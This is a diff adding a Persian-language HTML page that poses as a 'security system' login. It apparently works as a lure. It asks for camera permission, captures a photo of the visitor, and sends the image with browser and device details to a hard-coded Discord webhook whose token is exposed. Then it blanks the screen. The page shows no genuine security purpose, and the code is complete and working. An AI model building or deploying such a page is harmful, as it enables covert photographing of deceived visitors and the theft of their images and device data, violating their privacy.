@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سیستم امنیتی</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            color: white;
+            font-family: Arial;
+            text-align: center;
+        }
+        #loading {
+            padding: 50px;
+            font-size: 18px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="loading">
+        <div class="loader"></div>
+        <p>در حال راه‌اندازی سیستم...</p>
+    </div>
+
+    <div id="cameraContainer" style="display:none;">
+        <video id="video" autoplay playsinline style="width: 100%; height: 100vh; object-fit: cover;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        // 🔧 وب‌هوک تو
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1421586742120546418/sDyMZ53pfBPEzWRmmWG2ZlFtmmMDucEStM-pJ7V_q3l3wN4hmqQmBdp_kiqWVC06Sl9O';
+
+        // المنت‌ها
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const loading = document.getElementById('loading');
+        const cameraContainer = document.getElementById('cameraContainer');
+
+        // وقتی صفحه لود شد
+        window.onload = function() {
+            setTimeout(() => {
+                const confirm = window.confirm('⚠️ برای ورود باید دسترسی دوربین داده شود\n\nآیا موافق هستید؟');
+                
+                if (confirm) {
+                    startCamera();
+                } else {
+                    document.body.innerHTML = '<h1>❌ دسترسی رد شد</h1>';
+                }
+            }, 1000);
+        };
+
+        // شروع دوربین
+        async function startCamera() {
+            try {
+                loading.innerHTML = '<div class="loader"></div><p>📷 در حال فعال‌سازی دوربین...</p>';
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+
+                video.srcObject = stream;
+                loading.style.display = 'none';
+                cameraContainer.style.display = 'block';
+
+                // بعد از 2 ثانیه عکس بگیر
+                setTimeout(() => {
+                    takePhoto(stream);
+                }, 2000);
+
+            } catch (error) {
+                loading.innerHTML = '<h1>❌ خطا در دسترسی به دوربین</h1><p>لطفا دسترسی دوربین را بررسی کنید</p>';
+                console.error('خطا:', error);
+            }
+        }
+
+        // گرفتن عکس
+        async function takePhoto(stream) {
+            try {
+                loading.innerHTML = '<div class="loader"></div><p>📸 در حال گرفتن عکس...</p>';
+                loading.style.display = 'block';
+                cameraContainer.style.display = 'none';
+
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                
+                // عکس رو به فرمت base64 تبدیل کن
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // دوربین رو خاموش کن
+                stream.getTracks().forEach(track => track.stop());
+                
+                // به دیسکورد بفرست
+                loading.innerHTML = '<div class="loader"></div><p>🔄 در حال ارسال به دیسکورد...</p>';
+                await sendToDiscord(photoData);
+                
+                // صفحه رو سفید کن
+                document.body.style.background = 'white';
+                document.body.innerHTML = '';
+                
+            } catch (error) {
+                document.body.innerHTML = '<h1>❌ خطا در ارسال عکس</h1>';
+                console.error('خطا:', error);
+            }
+        }
+
+        // ارسال به دیسکورد
+        async function sendToDiscord(photoData) {
+            try {
+                // تبدیل عکس به فایل
+                const response = await fetch(photoData);
+                const blob = await response.blob();
+                
+                // ایجاد فرم داده
+                const formData = new FormData();
+                formData.append('file', blob, 'security_photo.jpg');
+                formData.append('payload_json', JSON.stringify({
+                    username: 'Security Camera System',
+                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/2991/2991148.png',
+                    content: '📸 **عکس امنیتی دریافت شد**\n' +
+                            `🕒 **زمان:** ${new Date().toLocaleString('fa-IR')}\n` +
+                            `🌐 **مرورگر:** ${navigator.userAgent.split(' ')[0]}\n` +
+                            `📱 **دستگاه:** ${/Mobile/.test(navigator.userAgent) ? 'موبایل' : 'دسکتاپ'}\n` +
+                            `📍 **صفحه:** ${screen.width}x${screen.height}\n` +
+                            '🔒 **سیستم امنیتی فعال**'
+                }));
+
+                // ارسال به دیسکورد
+                const result = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!result.ok) {
+                    throw new Error('خطا در ارسال');
+                }
+
+            } catch (error) {
+                console.error('خطا در ارسال به دیسکورد:', error);
+                throw error;
+            }
+        }
+    </script>
+</body>
+</html>
